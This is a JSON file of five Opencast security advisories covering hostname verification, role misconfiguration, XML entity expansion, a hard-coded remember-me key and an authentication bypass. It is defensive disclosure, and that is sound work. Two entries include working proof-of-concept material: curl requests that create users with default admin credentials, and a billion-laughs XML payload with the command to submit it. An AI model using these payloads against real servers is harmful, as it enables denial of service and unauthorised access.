{
  "vulns": [
    {
      "id": "GHSA-44cw-p2hm-gpf6",
      "summary": "Disabled Hostname Verification in Opencast",
      "details": "Opencast before version 8.9 and 7.9 disables HTTPS hostname verification of its HTTP client used for a large portion of Opencast's HTTP requests.\n\nHostname verification is an important part when using HTTPS to ensure that the presented certificate is valid for the host. Disabling it can allow for man-in-the-middle attacks.\n\n### Patches\n\nThis problem is fixed in Opencast 7.9 and Opencast 8.9\n\n### Self-Signed Certificates\n\nPlease be aware that fixing the problem means that Opencast will not simply accept any self-signed certificates any longer without properly importing them. If you need those, please make sure to import them into the Java key store. Better yet, get a valid certificate e.g. from [Let's Encrypt](https://letsencrypt.org).",
      "aliases": [
        "CVE-2020-26234"
      ],
      "modified": "2022-02-08T23:07:51.549040Z",
      "published": "2020-12-08T22:37:59Z",
      "references": [
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/security/advisories/GHSA-44cw-p2hm-gpf6"
        },
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/commit/4225bf90af74557deaf8fb6b80b0705c9621acfc"
        },
        {
          "type": "ADVISORY",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26234"
        },
        {
          "type": "ADVISORY",
          "url": "https://github.com/advisories/GHSA-44cw-p2hm-gpf6"
        }
      ],
      "affected": [
        {
          "package": {
            "name": "org.opencastproject:opencast-kernel",
            "ecosystem": "Maven",
            "purl": "pkg:maven/org.opencastproject:opencast-kernel"
          },
          "ranges": [
            {
              "type": "ECOSYSTEM",
              "events": [
                {
                  "introduced": "0"
                },
                {
                  "introduced": "8.0"
                },
                {
                  "fixed": "8.9"
                },
                {
                  "fixed": "7.9"
                }
              ]
            }
          ],
          "versions": [
            "6.6",
            "7.2",
            "7.3",
            "7.4",
            "7.5",
            "7.6",
            "7.7",
            "7.8",
            "8.0",
            "8.1",
            "8.3",
            "8.4",
            "8.5",
            "8.6",
            "8.7",
            "8.8"
          ],
          "database_specific": {
            "ghsa": "https://github.com/advisories/GHSA-44cw-p2hm-gpf6",
            "cwes": [
              {
                "name": "Improper Validation of Certificate with Host Mismatch",
                "description": "The software communicates with a host that provides a certificate, but the software does not properly ensure that the certificate is actually associated with that host.",
                "cweId": "CWE-297"
              }
            ],
            "source": "https://storage.googleapis.com/ghsa-osv/GHSA-44cw-p2hm-gpf6.json",
            "cvss": {
              "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
              "score": 4.8
            }
          }
        }
      ],
      "schema_version": "1.2.0"
    },
    {
      "id": "GHSA-94qw-r73x-j7hg",
      "summary": "Users with ROLE_COURSE_ADMIN can create new users in Opencast",
      "details": "### Impact\n\nUsers with the role `ROLE_COURSE_ADMIN` can use the user-utils endpoint to create new users not including the role `ROLE_ADMIN`. For example:\n\n```bash\n# Use the admin to create a new user with ROLE_COURSE_ADMIN using the admin user.\n# We expect this to work.\n% curl -i -u admin:opencast 'https://example.opencast.org/user-utils/xy.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP/2 201\n\n# Use the new user to create more new users.\n# We don't expüect a user with just role ROLE_COURSE_ADMIN to succeed.\n# But it does work\n% curl -i -u xy:f 'https://example.opencast.org/user-utils/ab.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP/2 201\n```\n`ROLE_COURSE_ADMIN` is a non-standard role in Opencast which is referenced neither in the documentation nor in any code (except for tests) but only in the security configuration. From the name – implying an admin for a specific course – users would never expect that this role allows user creation.\n\n### Patches\n\nThis issue is fixed in 7.6 and 8.1 which both ship a new default security configuration.\n\n### Workarounds\n\nYou can fix this issue by removing all instances of `ROLE_COURSE_ADMIN` in your organization's security configuration (`etc/security/mh_default_org.xml` by default).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
      "aliases": [
        "CVE-2020-5231"
      ],
      "modified": "2022-02-06T23:24:23.536378Z",
      "published": "2020-01-30T21:21:37Z",
      "references": [
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/security/advisories/GHSA-94qw-r73x-j7hg"
        },
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/commit/72fad0031d8a82c860e2bde0b27570c5042320ee"
        },
        {
          "type": "ADVISORY",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5231"
        },
        {
          "type": "ADVISORY",
          "url": "https://github.com/advisories/GHSA-94qw-r73x-j7hg"
        }
      ],
      "affected": [
        {
          "package": {
            "name": "org.opencastproject:opencast-kernel",
            "ecosystem": "Maven",
            "purl": "pkg:maven/org.opencastproject:opencast-kernel"
          },
          "ranges": [
            {
              "type": "ECOSYSTEM",
              "events": [
                {
                  "introduced": "0"
                },
                {
                  "introduced": "8.0"
                },
                {
                  "fixed": "8.1"
                },
                {
                  "fixed": "7.6"
                }
              ]
            }
          ],
          "versions": [
            "6.6",
            "7.2",
            "7.3",
            "7.4",
            "7.5",
            "8.0"
          ],
          "database_specific": {
            "ghsa": "https://github.com/advisories/GHSA-94qw-r73x-j7hg",
            "cwes": [
              {
                "cweId": "CWE-285",
                "name": "Improper Authorization",
                "description": "The software does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
              }
            ],
            "cvss": {
              "score": 4.8,
              "vectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"
            },
            "source": "https://storage.googleapis.com/ghsa-osv/GHSA-94qw-r73x-j7hg.json"
          }
        }
      ],
      "schema_version": "1.2.0"
    },
    {
      "id": "GHSA-9gwx-9cwp-5c2m",
      "summary": "Billion laughs attack (XML bomb)",
      "details": "### Impact\n\nOpencast is vulnerable to the [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)  which allows an attacker to easily execute a (seemingly permanent) denial of service attack, essentially taking down Opencast using a single HTTP request.\n\nConsider an XML file (`createMediaPackage.xml`) like this:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum. \">\n <!ELEMENT title (#PCDATA)>\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<mediapackage xmlns=\"http://mediapackage.opencastproject.org\" id=\"d162d5b2-b54f-4400-a268-ee6565b0e6e7\" start=\"2020-01-23T23:08:37Z\">\n  <title>&lol5;</title>\n  <media/>\n  <metadata/>\n  <attachments/>\n  <publications/>\n</mediapackage>\n```\n\nThrowing this at Opencast will cause Opencast to parse the XML and expand the Lorem Ipsum about 100 000 times, instantly consuming a huge amount of memory:\n\n```sh\ncurl -i -u admin:opencast https://develop.opencast.org/ingestdownload/ingestdownload \\\n  -F 'mediapackage=<createMediaPackage.xml' \\\n  -F sourceFlavors=\"\" \\\n  -F sourceTags=\"\" \\\n  -F deleteExternal=\"\" \\\n  -F tagsAndFlavor='' \\\n  -o out.xml\n```\n\nAdditional notes:\n\n- You can likely use other endpoints accepting XML (this was just the first one I tried) and depending on how much memory you want to consume, you might want to enlarge the lorem ipsum text.\n- Opencast's XML parser does limit the expansion to 100 000 times, already limiting the attack. Nevertheless, this can already harm the system. \n- To exploit this, users need to have ingest privileges, limiting the group of potential attackers\n\n### Patches\n\nThe problem has been fixed in Opencast 9.6. Older versions of Opencast are not patched sue to the extent of this patch.\n\n### Workarounds\n\nThere is no known workaround for this issue.\n\n### References\n\n- [Billion laughs attack explained](https://en.wikipedia.org/wiki/Billion_laughs_attack)\n- For technical details, take a look at the patch fixing the issue: https://github.com/opencast/opencast/commit/_________\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [our issue tracker](https://github.com/opencast/opencast/issues)\n- Email us at [security@opencast.org](mailto:security@opencast.org)",
      "aliases": [
        "CVE-2021-32623"
      ],
      "modified": "2022-02-08T23:17:59.638972Z",
      "published": "2021-06-17T20:11:35Z",
      "references": [
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/security/advisories/GHSA-9gwx-9cwp-5c2m"
        },
        {
          "type": "ADVISORY",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32623"
        },
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/commit/16b0d641713fe31b8518fcf14fc5e4e815d81206"
        },
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/commit/8ae27da5a6f658011a5741b3210e715b0dc6213e"
        },
        {
          "type": "ADVISORY",
          "url": "https://github.com/advisories/GHSA-9gwx-9cwp-5c2m"
        }
      ],
      "affected": [
        {
          "package": {
            "name": "org.opencastproject:opencast-kernel",
            "ecosystem": "Maven",
            "purl": "pkg:maven/org.opencastproject:opencast-kernel"
          },
          "ranges": [
            {
              "type": "ECOSYSTEM",
              "events": [
                {
                  "introduced": "0"
                },
                {
                  "fixed": "9.6"
                }
              ]
            }
          ],
          "versions": [
            "6.6",
            "7.2",
            "7.3",
            "7.4",
            "7.5",
            "7.6",
            "7.7",
            "7.8",
            "7.9",
            "8.0",
            "8.1",
            "8.10",
            "8.11",
            "8.3",
            "8.4",
            "8.5",
            "8.6",
            "8.7",
            "8.8",
            "8.9",
            "9.0",
            "9.1",
            "9.2",
            "9.3",
            "9.4",
            "9.5"
          ],
          "database_specific": {
            "cvss": {
              "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
              "score": 8.1
            },
            "ghsa": "https://github.com/advisories/GHSA-9gwx-9cwp-5c2m",
            "source": "https://storage.googleapis.com/ghsa-osv/GHSA-9gwx-9cwp-5c2m.json",
            "cwes": [
              {
                "description": "The software uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities.",
                "cweId": "CWE-776",
                "name": "Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')"
              }
            ]
          }
        }
      ],
      "schema_version": "1.2.0"
    },
    {
      "id": "GHSA-mh8g-hprg-8363",
      "summary": "Hard-Coded Key Used For Remember-me Token in Opencast",
      "details": "### Impact\n\nThe security configuration in `etc/security/mh_default_org.xml` enables a remember-me cookie based on a hash created from the [username, password, and an additional system key](https://docs.spring.io/spring-security/site/docs/3.0.x/reference/remember-me.html). Opencast has hard-coded this system key in the large XML file and never mentions to change this, basically ensuring that all systems use the same key:\n\n```xml\n<sec:remember-me key=\"opencast\" user-service-ref=\"userDetailsService\" />\n```\n\nThis means that an attacker getting access to a remember-me token for one server can get access to all servers which allow log-in using the same credentials without ever needing the credentials. For example, a remember-me token obtained from develop.opencast.org can be used on stable.opencast.org without actually knowing the log-in credentials.\n\nSuch an attack will usually not work on different installations – assuming that safe, unique passwords are used – but it is basically guaranteed to work to get access to all machines of one cluster if a token from one machine is compromised.\n\n### Patches\n\nThis problem is fixed in Opencast 7.6 and Opencast 8.1\n\n### Workarounds\n\nWe strongly recommend updating to the patched version. Still, as a workaround for older versions, in `etc/security/mh_default_org.xml`, set a custom key for each server:\n\n```xml\n<sec:remember-me key=\"CUSTOM_RANDOM_KEY\" user-service-ref=\"userDetailsService\" />\n```\n\n### References\n\n- [Relevant lines in the security configuration](https://github.com/opencast/opencast/blob/161ee619382f144dc35eea211fc6b556025b98e1/etc/security/mh_default_org.xml#L335-L336)\n- [Spring Security Remember-Me Authentication Documentation](https://docs.spring.io/spring-security/site/docs/3.0.x/reference/remember-me.html#remember-me-hash-token)\n\n### For more information\nIf you have any questions or comments about this advisory:\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at [security@opencast.org](mailto:security@opencast.org)\n\n### Thanks\nThanks to @LukasKalbertodt for reporting the issue.",
      "aliases": [
        "CVE-2020-5222"
      ],
      "modified": "2022-02-08T23:33:11.869908Z",
      "published": "2020-01-30T21:21:44Z",
      "references": [
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/security/advisories/GHSA-mh8g-hprg-8363"
        },
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/commit/1a7172c95af8d542a77ae5b153e4c834dd4788a6"
        },
        {
          "type": "ADVISORY",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5222"
        },
        {
          "type": "ADVISORY",
          "url": "https://github.com/advisories/GHSA-mh8g-hprg-8363"
        }
      ],
      "affected": [
        {
          "package": {
            "name": "org.opencastproject:opencast-kernel",
            "ecosystem": "Maven",
            "purl": "pkg:maven/org.opencastproject:opencast-kernel"
          },
          "ranges": [
            {
              "type": "ECOSYSTEM",
              "events": [
                {
                  "introduced": "0"
                },
                {
                  "introduced": "8.0"
                },
                {
                  "fixed": "8.1"
                },
                {
                  "fixed": "7.6"
                }
              ]
            }
          ],
          "versions": [
            "6.6",
            "7.2",
            "7.3",
            "7.4",
            "7.5",
            "8.0"
          ],
          "database_specific": {
            "ghsa": "https://github.com/advisories/GHSA-mh8g-hprg-8363",
            "cwes": [
              {
                "cweId": "CWE-798",
                "description": "The software contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.",
                "name": "Use of Hard-coded Credentials"
              }
            ],
            "cvss": {
              "score": 6.8,
              "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N"
            },
            "source": "https://storage.googleapis.com/ghsa-osv/GHSA-mh8g-hprg-8363.json"
          }
        }
      ],
      "schema_version": "1.2.0"
    },
    {
      "id": "GHSA-vmm6-w4cf-7f3x",
      "summary": "Authentication Bypass For Endpoints With Anonymous Access in Opencast",
      "details": "### Impact\n\nUsing a remember-me cookie with an arbitrary username can cause Opencast to assume proper authentication for that user even if the remember-me cookie was incorrect given that the attacked endpoint also allows anonymous access.\n\nThis way, an attacker can, for example, fake a remember-me token, assume the identity of the global system administrator and request non-public content from the search service without ever providing any proper authentication.\n\n\n### Patches\n\nThis problem is fixed in Opencast 7.6 and Opencast 8.1\n\n\n### Workarounds\n\nAs a workaround for older, unpatched versions, disabling remember-me cookies in `etc/security/mh_default_org.xml` will mitigate the problem but will obviously also disable this feature without obvious indication. To deactivate this, remove the following line from the security configuration:\n\n```xml\n<sec:remember-me … />\n```\n\n### References\n\n- [Remember-me cookie in the security configuration file](https://github.com/opencast/opencast/blob/161ee619382f144dc35eea211fc6b556025b98e1/etc/security/mh_default_org.xml#L335-L336)\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
      "aliases": [
        "CVE-2020-5206"
      ],
      "modified": "2022-02-08T23:43:34.364650Z",
      "published": "2020-01-30T21:21:30Z",
      "references": [
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/security/advisories/GHSA-vmm6-w4cf-7f3x"
        },
        {
          "type": "WEB",
          "url": "https://github.com/opencast/opencast/commit/b157e1fb3b35991ca7bf59f0730329fbe7ce82e8"
        },
        {
          "type": "ADVISORY",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5206"
        },
        {
          "type": "ADVISORY",
          "url": "https://github.com/advisories/GHSA-vmm6-w4cf-7f3x"
        }
      ],
      "affected": [
        {
          "package": {
            "name": "org.opencastproject:opencast-kernel",
            "ecosystem": "Maven",
            "purl": "pkg:maven/org.opencastproject:opencast-kernel"
          },
          "ranges": [
            {
              "type": "ECOSYSTEM",
              "events": [
                {
                  "introduced": "0"
                },
                {
                  "introduced": "8.0"
                },
                {
                  "fixed": "8.1"
                },
                {
                  "fixed": "7.6"
                }
              ]
            }
          ],
          "versions": [
            "6.6",
            "7.2",
            "7.3",
            "7.4",
            "7.5",
            "8.0"
          ],
          "database_specific": {
            "cvss": {
              "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N",
              "score": 8.7
            },
            "ghsa": "https://github.com/advisories/GHSA-vmm6-w4cf-7f3x",
            "cwes": [
              {
                "description": "The software does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.",
                "cweId": "CWE-285",
                "name": "Improper Authorization"
              }
            ],
            "source": "https://storage.googleapis.com/ghsa-osv/GHSA-vmm6-w4cf-7f3x.json"
          }
        }
      ],
      "schema_version": "1.2.0"
    }
  ]
}